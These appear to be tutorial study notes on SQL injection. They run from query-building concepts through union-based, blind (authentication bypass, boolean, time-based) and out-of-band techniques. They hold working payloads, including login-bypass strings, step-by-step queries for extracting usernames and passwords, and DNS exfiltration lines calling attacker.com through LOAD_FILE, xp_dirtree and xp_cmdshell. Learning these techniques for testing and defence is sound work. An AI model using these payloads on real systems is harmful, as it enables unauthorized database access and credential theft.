# SQL Injection — Building Block Concepts

## Comments
- `--` (with trailing space) or `#` start a single-line comment in MySQL; `/* */` for multi-line.
- Used to truncate the rest of a query after injecting, avoiding syntax errors from leftover SQL.
- Example: injecting `admin'--` as username removes the password check entirely.

## UNION
- Combines results of two+ `SELECT` statements into one result set.
- Requires **same number of columns** with compatible types across both queries.
- Basis of **Union-Based SQL Injection** — lets an attacker append a `SELECT` pulling data from arbitrary tables, as long as column count matches the original query.

## LIKE and Wildcards
- `LIKE` does pattern matching; `%` = any sequence of characters, `_` = exactly one character.
- Used in **Blind SQL Injection** to enumerate data character-by-character (e.g., testing `LIKE 'a%'`, `LIKE 'b%'`, ...).

## LIMIT
- Restricts rows returned; syntax `LIMIT offset, count`.
- In payloads, controls which specific row is returned or keeps output manageable.

## String Functions
- **`group_concat()`** — aggregates values across multiple rows into a single delimited string (custom separator supported). Great for pulling many results in one shot.
- **`CONCAT()`** — joins values within a single row (e.g., `CONCAT(username, ':', password)`).

## `information_schema`
- Built-in metadata database present in MySQL, MariaDB, and PostgreSQL — a "map" of all databases/tables/columns on the server.
- Key tables:
  - **`information_schema.tables`** — `table_schema` (database name), `table_name` (table name).
  - **`information_schema.columns`** — `table_name`, `column_name` reveal table structure.
- Central to Union-Based injection: turns confirmed injectability into full schema enumeration (databases → tables → columns → data).

# SQL Injection — Fundamentals

## What It Is
SQL Injection occurs when a web application incorporates user-supplied input directly into a SQL query without proper sanitisation or parameterisation. The attacker's input is treated as SQL code rather than data, letting them alter the query's logic and interact with the database in unintended ways.

## How Web Applications Use SQL
Dynamic pages are typically generated by inserting user input (e.g., a URL parameter) into a SQL query. Example:

```sql
SELECT * FROM articles WHERE id = 1 AND public = 1;
```

The server takes `id` from the URL, inserts it into the query, and renders the result.

## Where the Vulnerability Lives
The issue arises when user input is concatenated directly into the query string:

```php
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";
```

Changing `?id=1 OR 1=1--` turns the query into:

```sql
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
```

- `OR 1=1` makes the `WHERE` clause always true.
- `--` comments out the trailing `AND public = 1` check.
- Result: all articles (including private ones) are returned.

## Three Types of SQL Injection

### In-Band
Results returned directly in the application's response.
- **Error-Based** — database error messages reveal structural info.
- **Union-Based** — `UNION` appends a second query to extract data via page output.

### Blind
No query results or errors displayed; must infer via indirect signals.
- **Authentication Bypass** — login succeeds/fails based on injected logic.
- **Boolean-Based** — response content changes subtly based on a true/false condition.
- **Time-Based** — `SLEEP()` introduces a delay; slow response = true, fast = false.

### Out-of-Band
Database server makes an external network request (e.g., DNS lookup) to exfiltrate data through a separate channel. Used when in-band/blind techniques aren't viable.

## Detecting SQL Injection
Test every input that touches the database: URL parameters, form fields (login, search, comments), cookies, HTTP headers.

Basic detection payloads:
- `'` (single quote) — database error suggests unsanitised input.
- `"` (double quote) — for queries using double-quoted strings.
- `;--` — different behavior indicates comment syntax is being processed.
- `OR 1=1` — changed results indicate input sits directly in query logic.

If errors are suppressed, fall back to **Boolean-Based** (behavioral differences) or **Time-Based** (timing delays) detection.

# In-Band SQL Injection

"In-Band" means the injection and the extracted results travel over the same channel — you inject via a web request and see the data right in the response.

## Error-Based SQL Injection
Exploits raw database error messages shown to the user due to misconfiguration.

- Injecting a single quote `'` might produce:
`You have an error in your SQL syntax; ... near ''1'' at line 1`
- Reveals: database type (MySQL), that input is wrapped in single quotes, and that errors aren't handled gracefully.
- Useful for reconnaissance; can be refined into precise payloads for deliberate error-based extraction.

## Union-Based SQL Injection
Uses `UNION` to append a custom `SELECT` to the original query, pulling data from any accessible table.

### Step 1 — Determine number of columns
Increment values in `UNION SELECT` until the error disappears:
```sql
1 UNION SELECT 1          -- error
1 UNION SELECT 1,2        -- error
1 UNION SELECT 1,2,3      -- success (3 columns)
```

### Step 2 — Identify displayed columns
Force the original query to return nothing (e.g., id = `0`) so only `UNION` output shows:
```sql
0 UNION SELECT 1,2,3
```
Whichever number(s) appear on the page mark the usable extraction column(s).

### Step 3 — Extract the database name
Replace a visible column with `database()`:
```sql
0 UNION SELECT 1,2,database()
```

### Step 4 — Enumerate tables
Query `information_schema.tables`:
```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
```

### Step 5 — Enumerate columns
Query `information_schema.columns` for a target table:
```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
```

### Step 6 — Extract data
Pull actual values using known table/column names:
```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
```

## Why It Works
- **Column count must match** — required by SQL's `UNION` definition.
- **`0`/`-1` as ID** — forces the original query to return empty, so only injected results render.
- **`information_schema`** — the database's own catalogue of its structure, used to map databases → tables → columns → data.

# Blind SQL Injection — Authentication Bypass

## What Makes It "Blind"
The application shows no query results or error messages. The injection still runs against the database, but success/failure must be inferred from application behavior — login success, changed page content, or response timing.

## How Authentication Queries Work
Login forms typically build a query like:
```sql
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
```
- A returned row → valid credentials → logged in.
- No rows → "Invalid credentials."
- The actual query output is never shown to the user.

## The Attack
You don't need valid credentials — just need the query to return at least one row.

Username payload: `' OR 1=1;--`
```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```
Breakdown:
- `username=''` — no match on its own.
- `OR 1=1` — always true, so the whole `WHERE` clause evaluates true.
- `;--` — ends the statement and comments out the rest (including the password check).
- Result: every row returned; app logs you in as the first user (often admin).

## Targeting a Specific User
If the admin's username is known, inject `admin'--`:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
```
The password check is commented out entirely — logged in as admin with no password needed.

## Payload Variations
- `' OR 1=1;--` — classic, for single-quoted input.
- `' OR 1=1#` — MySQL-style comment using `#`.
- `" OR 1=1--` — for double-quoted queries.
- Test both username **and** password fields — only one may be concatenated into the query.

## Detection in the Field
Enter `' OR 1=1;--` as username and any string as password. Successful login confirms SQL Injection vulnerability.

# Boolean-Based and Time-Based Blind SQL Injection

Authentication bypass gets you past a login, but Boolean-Based and Time-Based Blind SQLi let you extract actual data (usernames, passwords, entire databases) one character at a time when there's no visible output.

## Boolean-Based Blind SQL Injection
The application returns a binary true/false signal — different content, a JSON flag like `{"taken":true}`, or a subtle HTML change. This two-state feedback lets you ask the database yes/no questions.

**Example scenario:** a username-check endpoint returns `{"taken":true}` or `{"taken":false}` depending on whether a username exists, implying a backend query like:
```sql
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```

### Step 1 — Confirm injection
Inject a condition that's always true:
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```
A `true` response confirms injection works.

### Step 2 — Guess the database name character by character
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```
Cycle through letters (`a%`, `b%`, `c%`...) until the response flips to true, then move to the next character (`sa%`, `sb%`...), narrowing until the full name is found.

### Step 3 — Get table and column names
Apply the same character-guessing technique against `information_schema.tables` and `information_schema.columns`:
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
```
Repeat for column names, then for actual data values.

**Trade-off:** slow (multiple requests per character) but reliable, even when all other output channels are locked down.

## Time-Based Blind SQL Injection
Used when the application gives no visual signal at all — identical content, status code, and headers regardless of input. The only signal is response time.

MySQL's `SLEEP()` pauses execution when a condition is true:
```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```
A ~5 second delay confirms the condition (database name starts with 's').

### Step 1 — Find the column count
```sql
admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)
admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
```

### Step 2 — Enumerate data
Same character-cycling process as Boolean-Based, but read delay (true) vs. no delay (false) instead of page content.

**Caution:** Network latency can produce false positives. Use longer sleep values (5–10s) and test each character multiple times to confirm. MSSQL equivalent: `WAITFOR DELAY '0:0:5'`.

## When To Use Which

| Scenario | Technique |
|---|---|
| App shows different content for true vs false | Boolean-Based |
| App response looks identical, no matter what | Time-Based |
| Time-based is blocked or too unreliable | Out-of-Band |

# Out-of-Band (OOB) SQL Injection

## What It Is
Instead of reading results through the web response, OOB forces the database server to reach out to a server you control via a separate channel (usually DNS or HTTP), carrying stolen data with it.

## When You Need It
Used when everything else has failed:
- **In-Band** off the table — no visible query results or errors.
- **Boolean-Based** doesn't work — response looks identical regardless of condition.
- **Time-Based** unreliable — noisy network, or `SLEEP()` blocked.
- **Requirement:** the database server must be able to make outbound connections. If outbound traffic is firewalled, OOB is not viable.

Less commonly needed than In-Band or Blind, but can be the only option when other avenues are shut down and the DB has network access.

## How It Works
Two channels:
1. **Attack channel** — the normal web request carrying the injection payload.
2. **Data channel** — an outbound DNS/HTTP request the database server makes to your server, with exfiltrated data embedded in it.

## DNS Exfiltration With MySQL
Uses `LOAD_FILE()` to trigger a DNS lookup, embedding data as a subdomain:
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```
Process:
1. `(SELECT database())` retrieves the database name (e.g., `webapp_db`).
2. `CONCAT()` builds `\\webapp_db.attacker.com\share`.
3. `LOAD_FILE()` attempts to read that path — on Windows, this triggers a DNS lookup for `webapp_db.attacker.com`.
4. Your DNS server logs the request, capturing `webapp_db` from the subdomain.

Works best on Windows-based MySQL servers, where UNC paths trigger DNS resolution.

## MSSQL Techniques
- **`xp_dirtree`** — triggers a DNS lookup by attempting to list a remote directory:
```sql
  EXEC master..xp_dirtree '\\attacker.com\share';
```
- **`xp_cmdshell`** (if enabled) — runs OS commands directly (e.g., `nslookup`, `curl`) to ship data out:
```sql
  EXEC xp_cmdshell 'nslookup data.attacker.com';
```
- `xp_cmdshell` is disabled by default in modern MSSQL; `xp_dirtree` remains available and commonly used in pentests.

## Receiving the Data
Requires a listener on your end:
- **Burp Collaborator** — unique subdomain, logs DNS/HTTP callbacks.
- **Interactsh** (ProjectDiscovery) — free, self-hostable equivalent.
- **Custom listener** — e.g., a Python DNS server (`dnslib`) or basic HTTP server for full control.

## Limitations
- Requires outbound network access from the DB server (often restricted in production).
- Payloads are database-engine-specific (MySQL, MSSQL, PostgreSQL each differ).
- DNS exfiltration limited to 63 characters per subdomain label.
- Generally slower and flakier than direct data extraction.
